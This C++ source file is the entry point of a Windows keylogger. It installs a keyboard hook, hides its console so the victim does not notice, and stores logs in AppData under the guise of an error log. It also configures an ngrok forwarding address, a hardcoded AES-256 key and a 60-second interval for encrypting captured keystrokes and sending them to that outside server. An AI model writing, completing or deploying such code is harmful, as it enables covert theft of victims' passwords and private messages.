// This is me ignoring the fact that in the auxiliary header file, I used the unsafe localtime function instead of the safe localtime_s function
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include "IO.h"
#include "Keyboard.h"
#include "Transformer.h"
#include "Timer.h"
#include "Exfiltrate.h"
#include "APIHook.h"
#include "Auxiliary.h"

void setOptions(std::string httpServerAddressOption,
    std::string keyStrOption,
    int intervalSecondsOption);

int main()
{
    // Please set your desired options below, all three are mandatory

    std::string ngrokForwardingAddress = "06a8-73-32-226-14.ngrok.io";
    std::string aes256BitKeyString = "3272357538782F413F4428472B4B6250655368566D5971337436763979244226";
    int logExfiltrationInterval = 60; // SECONDS

    setOptions(ngrokForwardingAddress, aes256BitKeyString, logExfiltrationInterval);

    // Hook into the Windows system that handles key presses

    APIHook::installHook();
   
    // Hide console window

    Auxiliary::hideConsole();

    // If console window is hidden, then continue, otherwise we're burned
    
    if (!Auxiliary::isConsoleVisible())
    {
        // Create the directory where the error log will be stored

        IO::createDirectory(IO::getAppDataPath());

        MSG Msg;

        // Dummy loop to keep execution going

        while (GetMessage(&Msg, NULL, 0, 0))
        {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }

        APIHook::logExfilTimer.stopTimer();

    }

    return 0;
}

void setOptions(std::string httpServerAddressOption, std::string keyStrOption, int intervalSecondsOption)
{
    Exfiltrate::httpServerAddress = httpServerAddressOption;
    Transformer::keyStr = keyStrOption;
    APIHook::intervalSeconds = intervalSecondsOption;
}